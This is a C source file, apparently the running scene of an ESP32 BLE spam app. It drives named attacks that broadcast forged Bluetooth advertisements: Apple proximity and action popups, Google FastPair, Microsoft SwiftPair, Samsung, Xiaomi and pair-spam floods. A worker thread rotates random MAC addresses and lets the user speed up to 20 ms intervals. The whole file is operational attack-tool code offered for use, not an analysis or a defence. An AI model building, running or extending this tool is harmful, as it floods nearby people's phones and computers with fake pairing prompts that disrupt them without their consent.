#include "../ble_spam_app.h"
#include "../ble_spam_hal.h"
#include "../ble_spam_payloads.h"
#include "../views/ble_spam_view.h"

#include <esp_log.h>
#include <esp_timer.h>
#include <string.h>

#define TAG BLE_SPAM_LOG_TAG

static const char* attack_short_names[] = {
    [BleSpamAttackAppleDevice] = "Apple Device",
    [BleSpamAttackAppleAction] = "Apple Action",
    [BleSpamAttackAppleNotYourDevice] = "Apple NYD",
    [BleSpamAttackFastPair] = "FastPair",
    [BleSpamAttackSwiftPair] = "SwiftPair",
    [BleSpamAttackSamsungBuds] = "Samsung Buds",
    [BleSpamAttackSamsungWatch] = "Samsung Watch",
    [BleSpamAttackXiaomi] = "Xiaomi",
    [BleSpamAttackPairSpam] = "Pair Spam",
    [BleSpamAttackPairSpamRickroll] = "Pair Spam Rickroll",
    [BleSpamAttackPairSpamCustom] = "Pair Spam Custom",
};

static const uint32_t speed_steps[] = {20, 30, 40, 50, 100, 150, 200, 300, 500};
#define SPEED_STEP_COUNT (sizeof(speed_steps) / sizeof(speed_steps[0]))
#define BLE_SPAM_WORKER_STOP_FLAG (1UL << 0)

typedef enum {
    BleSpamWorkerStartStarted,
    BleSpamWorkerStartBusy,
    BleSpamWorkerStartFailed,
} BleSpamWorkerStartResult;

static FuriThread* s_spam_thread = NULL;

static uint32_t default_delay_for_attack(BleSpamAttackType attack_type) {
    switch(attack_type) {
    case BleSpamAttackAppleDevice:
    case BleSpamAttackAppleAction:
    case BleSpamAttackAppleNotYourDevice:
        return 20;
    case BleSpamAttackFastPair:
        return 50;
    case BleSpamAttackSwiftPair:
        return 30;
    case BleSpamAttackSamsungBuds:
    case BleSpamAttackSamsungWatch:
    case BleSpamAttackPairSpam:
    case BleSpamAttackPairSpamRickroll:
    case BleSpamAttackPairSpamCustom:
        return 50;
    case BleSpamAttackXiaomi:
        return 40;
    case BleSpamAttackCount:
        break;
    }

    return 100;
}

#define BLE_SPAM_TIMING_SAMPLE_COUNT 3U
typedef struct {
    uint32_t cycle_count;
    int64_t stop_us;
    int64_t address_us;
    int64_t payload_us;
    int64_t interval_us;
    int64_t data_us;
    int64_t start_us;
    int64_t setup_us;
    int64_t period_us;
} BleSpamTimingSample;

static BleSpamTimingSample s_timing_samples[BLE_SPAM_TIMING_SAMPLE_COUNT];
static int64_t s_previous_start_us = 0;

// HAL bring-up/teardown jalan di worker thread agar scene enter/exit tak freeze
// (bt_stop_stack + controller/bluedroid init ~300-500ms). s_hal_ready baru true
// setelah HAL siap; toggle spam diabaikan sampai saat itu.
static FuriThread*    s_hal_thread = NULL;
static bool s_hal_stop = false;
static bool s_hal_ready = false;
static bool s_hal_fail = false;
static bool s_start_requested = false;

static void status_lock(BleSpamApp* app) {
    furi_check(furi_mutex_acquire(app->status_mutex, FuriWaitForever) == FuriStatusOk);
}

static void status_unlock(BleSpamApp* app) {
    furi_check(furi_mutex_release(app->status_mutex) == FuriStatusOk);
}

static bool spam_worker_is_running(BleSpamApp* app) {
    status_lock(app);
    bool running = app->running;
    status_unlock(app);
    return running;
}

static bool hal_stop_requested(BleSpamApp* app) {
    status_lock(app);
    bool stop = s_hal_stop;
    status_unlock(app);
    return stop;
}

static int32_t spam_thread_fn(void* arg);

static int32_t hal_worker(void* arg) {
    BleSpamApp* app = arg;
    if(!ble_spam_hal_start()) {
        ble_spam_hal_stop(); // kembalikan btshim walau bring-up gagal
        status_lock(app);
        s_hal_ready = false;
        s_hal_fail = true;
        status_unlock(app);
        return 0;
    }

    status_lock(app);
    bool stop = s_hal_stop;
    s_hal_ready = !stop;
    status_unlock(app);

    while(!stop && !hal_stop_requested(app)) furi_delay_ms(50);
    ble_spam_hal_stop();

    status_lock(app);
    s_hal_ready = false;
    status_unlock(app);
    return 0;
}

static const char* attack_name_for_attack(BleSpamAttackType attack_type) {
    if((uint32_t)attack_type >= (uint32_t)BleSpamAttackCount) return "Unknown";
    const char* name = attack_short_names[attack_type];
    return name ? name : "Unknown";
}

static uint8_t build_next_payload(
    BleSpamApp* app,
    uint16_t current_index,
    uint16_t* next_index,
    uint8_t* buf,
    char* device_name,
    size_t device_name_size) {
    uint8_t len = 0;
    const char* name = "";
    *next_index = current_index;

    switch(app->attack_type) {
    case BleSpamAttackAppleDevice: {
        uint16_t idx = current_index % APPLE_DEVICE_COUNT;
        name = apple_devices[idx].name;
        len = ble_spam_build_apple_proximity(buf, apple_devices[idx].device_id);
        *next_index = idx + 1;
        break;
    }
    case BleSpamAttackAppleAction: {
        uint16_t idx = current_index % APPLE_ACTION_COUNT;
        name = apple_actions[idx].name;
        len = ble_spam_build_apple_nearby_action(buf, apple_actions[idx].action_id, apple_actions[idx].flags);
        *next_index = idx + 1;
        break;
    }
    case BleSpamAttackAppleNotYourDevice: {
        uint16_t idx = current_index % APPLE_DEVICE_COUNT;
        name = apple_devices[idx].name;
        len = ble_spam_build_apple_not_your_device(buf, apple_devices[idx].device_id);
        *next_index = idx + 1;
        break;
    }
    case BleSpamAttackFastPair: {
        uint16_t idx = current_index % FASTPAIR_MODEL_COUNT;
        name = "FastPair";
        len = ble_spam_build_fastpair(buf, fastpair_models[idx]);
        *next_index = idx + 1;
        break;
    }
    case BleSpamAttackSwiftPair: {
        uint16_t total = SWIFTPAIR_NAME_COUNT + SWIFTPAIR_HEADPHONE_COUNT;
        uint16_t idx = current_index % total;
        if(idx < SWIFTPAIR_NAME_COUNT) {
            name = swiftpair_names[idx];
            len = ble_spam_build_swiftpair(buf, swiftpair_names[idx]);
        } else {
            uint16_t hp_idx = idx - SWIFTPAIR_NAME_COUNT;
            name = swiftpair_headphone_names[hp_idx];
            len = ble_spam_build_swiftpair_headphone(buf, swiftpair_headphone_names[hp_idx]);
        }
        *next_index = idx + 1;
        break;
    }
    case BleSpamAttackSamsungBuds: {
        uint16_t idx = current_index % SAMSUNG_BUDS_COUNT;
        name = samsung_buds[idx].name;
        len = ble_spam_build_samsung_buds(buf, samsung_buds[idx].r, samsung_buds[idx].g, samsung_buds[idx].b);
        *next_index = idx + 1;
        break;
    }
    case BleSpamAttackSamsungWatch: {
        uint16_t idx = current_index % SAMSUNG_WATCH_COUNT;
        name = samsung_watches[idx].name;
        len = ble_spam_build_samsung_watch(buf, samsung_watches[idx].watch_id);
        *next_index = idx + 1;
        break;
    }
    case BleSpamAttackXiaomi:
        name = "Xiaomi Device";
        len = ble_spam_build_xiaomi(buf);
        break;
    case BleSpamAttackPairSpam: {
        uint16_t idx = current_index % PAIR_SPAM_DEVICE_COUNT;
        name = pair_spam_device_names[idx];
        len = ble_spam_build_pair_spam(buf, pair_spam_device_names[idx]);
        *next_index = idx + 1;
        break;
    }
    case BleSpamAttackPairSpamRickroll: {
        uint16_t idx = current_index % PAIR_SPAM_RICKROLL_COUNT;
        name = pair_spam_rickroll_names[idx];
        len = ble_spam_build_pair_spam(buf, pair_spam_rickroll_names[idx]);
        *next_index = idx + 1;
        break;
    }
    case BleSpamAttackPairSpamCustom: {
        name = app->custom_pair_name[0] ? app->custom_pair_name : "Pairable Device";
        len = ble_spam_build_pair_spam(buf, name);
        break;
    }
    default:
        break;
    }

    if(device_name && device_name_size > 0) {
        strncpy(device_name, name, device_name_size - 1);
        device_name[device_name_size - 1] = '\0';
    }
    return len;
}

static void ble_spam_reap_finished_worker(void) {
    if(s_spam_thread && furi_thread_get_state(s_spam_thread) == FuriThreadStateStopped) {
        furi_thread_join(s_spam_thread);
        furi_thread_free(s_spam_thread);
        s_spam_thread = NULL;
    }
}

static BleSpamWorkerStartResult ble_spam_start_worker(BleSpamApp* app) {
    if(spam_worker_is_running(app)) return BleSpamWorkerStartStarted;

    // A worker can stop itself after a HAL error. Reap that finished thread
    // before replacing its handle with a new worker.
    if(s_spam_thread) {
        if(furi_thread_get_state(s_spam_thread) != FuriThreadStateStopped) {
            return BleSpamWorkerStartBusy;
        }
        ble_spam_reap_finished_worker();
    }

    FuriThread* thread = furi_thread_alloc_ex("BleSpam", 4096, spam_thread_fn, app);
    if(!thread) {
        ESP_LOGE(TAG, "Could not allocate BLE spam worker thread");
        return BleSpamWorkerStartFailed;
    }

    memset(s_timing_samples, 0, sizeof(s_timing_samples));
    s_previous_start_us = 0;
    status_lock(app);
    app->running = true;
    status_unlock(app);

    s_spam_thread = thread;
    furi_thread_start(s_spam_thread);
    return BleSpamWorkerStartStarted;
}

static void ble_spam_request_worker_stop(BleSpamApp* app) {
    status_lock(app);
    bool was_running = app->running;
    app->running = false;
    status_unlock(app);
    if(s_spam_thread) {
        FuriThreadState thread_state = furi_thread_get_state(s_spam_thread);
        if(was_running && thread_state != FuriThreadStateStopped &&
             thread_state != FuriThreadStateStopping) {
            furi_thread_flags_set(furi_thread_get_id(s_spam_thread), BLE_SPAM_WORKER_STOP_FLAG);
        }
    }
}

static void ble_spam_stop_worker(BleSpamApp* app) {
    ble_spam_request_worker_stop(app);
    if(s_spam_thread) {
        furi_thread_join(s_spam_thread);
        furi_thread_free(s_spam_thread);
        s_spam_thread = NULL;
    }
}

static int32_t spam_thread_fn(void* arg) {
    BleSpamApp* app = arg;
    uint32_t timing_sample_count = 0;
    ESP_LOGI(TAG, "Spam thread started (attack=%d)", app->attack_type);
    furi_thread_flags_clear(BLE_SPAM_WORKER_STOP_FLAG);

    while(spam_worker_is_running(app)) {
        int64_t cycle_begin_us = esp_timer_get_time();
        int64_t step_begin_us = cycle_begin_us;
        if(!ble_spam_hal_stop_adv()) {
            ESP_LOGE(TAG, "Could not confirm advertising stop before payload change");
            break;
        }
        int64_t stop_us = esp_timer_get_time() - step_begin_us;
        if(!spam_worker_is_running(app)) break;

        // The HAL requires advertising to be stopped before the address changes.
        step_begin_us = esp_timer_get_time();
        if(!ble_spam_hal_set_random_addr()) {
            ESP_LOGE(TAG, "Could not confirm random address update");
            break;
        }
        int64_t address_us = esp_timer_get_time() - step_begin_us;
        if(!spam_worker_is_running(app)) break;

        uint8_t payload[31];
        char next_device[sizeof(app->current_device)];
        uint16_t next_index;
        step_begin_us = esp_timer_get_time();
        uint8_t len = build_next_payload(
            app,
            app->current_index,
            &next_index,
            payload,
            next_device,
            sizeof(next_device));
        int64_t payload_us = esp_timer_get_time() - step_begin_us;
        status_lock(app);
        uint32_t delay_ms = app->delay_ms;
        status_unlock(app);

        if(len > 0) {
            step_begin_us = esp_timer_get_time();
            if(!ble_spam_hal_set_adv_interval_ms(delay_ms)) {
                ESP_LOGE(TAG, "Could not configure advertising interval");
                break;
            }
            int64_t interval_us = esp_timer_get_time() - step_begin_us;

            step_begin_us = esp_timer_get_time();
            if(!ble_spam_hal_set_adv_data(payload, len)) {
                ESP_LOGE(TAG, "Could not confirm advertising data configuration");
                break;
            }
            int64_t data_us = esp_timer_get_time() - step_begin_us;
            if(!spam_worker_is_running(app)) break;

            step_begin_us = esp_timer_get_time();
            if(!ble_spam_hal_start_adv()) {
                ESP_LOGE(TAG, "Could not confirm advertising start");
                break;
            }
            int64_t start_completed_us = esp_timer_get_time();
            int64_t start_us = start_completed_us - step_begin_us;

            status_lock(app);
            app->current_index = next_index;
            strncpy(app->current_device, next_device, sizeof(app->current_device) - 1);
            app->current_device[sizeof(app->current_device) - 1] = '\0';
            app->packet_count++;
            uint32_t cycle_count = app->packet_count;
            status_unlock(app);

            if(timing_sample_count < BLE_SPAM_TIMING_SAMPLE_COUNT) {
                BleSpamTimingSample* sample = &s_timing_samples[timing_sample_count];
                sample->cycle_count = cycle_count;
                sample->stop_us = stop_us;
                sample->address_us = address_us;
                sample->payload_us = payload_us;
                sample->interval_us = interval_us;
                sample->data_us = data_us;
                sample->start_us = start_us;
                sample->setup_us = start_completed_us - cycle_begin_us;
                sample->period_us = s_previous_start_us == 0 ? 0 :
                                    start_completed_us - s_previous_start_us;
                timing_sample_count++;

                if(timing_sample_count == BLE_SPAM_TIMING_SAMPLE_COUNT) {
                    for(size_t i = 0; i < BLE_SPAM_TIMING_SAMPLE_COUNT; i++) {
                        const BleSpamTimingSample* timing = &s_timing_samples[i];
                        ESP_LOGI(
                            TAG,
                            "Timing cycle %lu: stop=%lld addr=%lld build=%lld interval=%lld data=%lld start=%lld setup=%lld period=%lld us",
                            (unsigned long)timing->cycle_count,
                            (long long)timing->stop_us,
                            (long long)timing->address_us,
                            (long long)timing->payload_us,
                            (long long)timing->interval_us,
                            (long long)timing->data_us,
                            (long long)timing->start_us,
                            (long long)timing->setup_us,
                            (long long)timing->period_us);
                    }
                }
            }
            s_previous_start_us = start_completed_us;
        } else {
            ESP_LOGW(TAG, "build_next_payload returned 0!");
            break;
        }

        uint32_t flags = furi_thread_flags_wait(
            BLE_SPAM_WORKER_STOP_FLAG, FuriFlagWaitAny, delay_ms);
        if((flags & FuriFlagError) != 0U) {
            if(flags != (uint32_t)FuriFlagErrorTimeout) {
                ESP_LOGE(TAG, "Spam worker flag wait failed: 0x%08lx", (unsigned long)flags);
                break;
            }
        } else if((flags & BLE_SPAM_WORKER_STOP_FLAG) != 0U) {
            break;
        }
        if(!spam_worker_is_running(app)) break;
    }

    if(!ble_spam_hal_stop_adv()) {
        ESP_LOGE(TAG, "Could not confirm advertising stop at worker exit");
    }
    status_lock(app);
    app->running = false;
    uint32_t cycle_count = app->packet_count;
    status_unlock(app);
    ESP_LOGI(TAG, "Spam thread stopped, %lu cycles started", (unsigned long)cycle_count);
    return 0;
}

void ble_spam_scene_running_on_enter(void* context) {
    BleSpamApp* app = context;

    s_start_requested = false;
    status_lock(app);
    app->running = false;
    app->packet_count = 0;
    app->delay_ms = default_delay_for_attack(app->attack_type);
    app->current_index = 0;
    app->current_device[0] = '\0';
    s_hal_stop = false;
    s_hal_ready = false;
    s_hal_fail = false;
    status_unlock(app);

    BleSpamRunningModel* model = view_get_model(app->view_running);
    strncpy(model->attack_name, attack_name_for_attack(app->attack_type), sizeof(model->attack_name) - 1);
    model->attack_name[sizeof(model->attack_name) - 1] = '\0';
    model->device_name[0] = '\0';
    model->packet_count = 0;
    model->delay_ms = app->delay_ms;
    model->running = false;
    view_commit_model(app->view_running, true);

    view_dispatcher_switch_to_view(app->view_dispatcher, BleSpamViewRunning);

    // Bring-up BT di worker agar scene tetap responsif saat masuk.
    s_hal_thread = furi_thread_alloc_ex("BleSpamHal", 8192, hal_worker, app);
    if(!s_hal_thread) {
        status_lock(app);
        s_hal_fail = true;
        status_unlock(app);
        ESP_LOGE(TAG, "Could not allocate BLE HAL worker thread");
        return;
    }
    furi_thread_start(s_hal_thread);
}

bool ble_spam_scene_running_on_event(void* context, SceneManagerEvent event) {
    BleSpamApp* app = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == BleSpamCustomEventToggle) {
            if(!spam_worker_is_running(app)) {
                status_lock(app);
                bool hal_ready = s_hal_ready;
                status_unlock(app);
                if(!hal_ready) {
                    // Queue the first press so bring-up does not silently drop it.
                    s_start_requested = !s_start_requested;
                    consumed = true;
                    return consumed;
                }
                if(s_start_requested) {
                    // A queued start can be cancelled before its worker is available.
                    s_start_requested = false;
                } else {
                    s_start_requested = true;
                    BleSpamWorkerStartResult result = ble_spam_start_worker(app);
                    if(result != BleSpamWorkerStartBusy) s_start_requested = false;
                }
            } else {
                s_start_requested = false;
                // Signal stop without joining on the UI event path. The next
                // tick reaps the worker after its in-flight GAP call completes.
                ble_spam_request_worker_stop(app);
            }
            consumed = true;
        } else if(event.event == BleSpamCustomEventSpeedUp) {
            status_lock(app);
            for(int i = SPEED_STEP_COUNT - 1; i >= 0; i--) {
                if(speed_steps[i] < app->delay_ms) {
                    app->delay_ms = speed_steps[i];
                    break;
                }
            }
            status_unlock(app);
            consumed = true;
        } else if(event.event == BleSpamCustomEventSpeedDown) {
            status_lock(app);
            for(size_t i = 0; i < SPEED_STEP_COUNT; i++) {
                if(speed_steps[i] > app->delay_ms) {
                    app->delay_ms = speed_steps[i];
                    break;
                }
            }
            status_unlock(app);
            consumed = true;
        }
    } else if(event.type == SceneManagerEventTypeTick) {
        status_lock(app);
        bool hal_fail = s_hal_fail;
        bool hal_ready = s_hal_ready;
        s_hal_fail = false;
        status_unlock(app);

        if(hal_fail) {
            // Bring-up gagal → kembali ke menu (sekali).
            s_start_requested = false;
            scene_manager_previous_scene(app->scene_manager);
            return true;
        }

        ble_spam_reap_finished_worker();
        if(hal_ready && s_start_requested && !spam_worker_is_running(app)) {
            BleSpamWorkerStartResult result = ble_spam_start_worker(app);
            if(result != BleSpamWorkerStartBusy) s_start_requested = false;
        }

        uint32_t packet_count;
        uint32_t delay_ms;
        bool running;
        char device_name[sizeof(app->current_device)];
        status_lock(app);
        packet_count = app->packet_count;
        delay_ms = app->delay_ms;
        running = app->running;
        strncpy(device_name, app->current_device, sizeof(device_name) - 1);
        device_name[sizeof(device_name) - 1] = '\0';
        status_unlock(app);

        BleSpamRunningModel* model = view_get_model(app->view_running);
        model->packet_count = packet_count;
        model->delay_ms = delay_ms;
        model->running = running;
        strncpy(model->device_name, device_name, sizeof(model->device_name) - 1);
        model->device_name[sizeof(model->device_name) - 1] = '\0';
        view_commit_model(app->view_running, true);
    }

    return consumed;
}

void ble_spam_scene_running_on_exit(void* context) {
    BleSpamApp* app = context;

    // 1) Hentikan spam loop lebih dulu (pakai adv) — sebelum HAL di-teardown.
    s_start_requested = false;
    ble_spam_stop_worker(app);

    // 2) Hentikan worker HAL; ia yang memanggil ble_spam_hal_stop() (teardown BT
    //    di worker, bukan di thread UI). join hanya menahan transisi scene sejenak.
    status_lock(app);
    s_hal_stop = true;
    status_unlock(app);
    if(s_hal_thread) {
        furi_thread_join(s_hal_thread);
        furi_thread_free(s_hal_thread);
        s_hal_thread = NULL;
    }
}
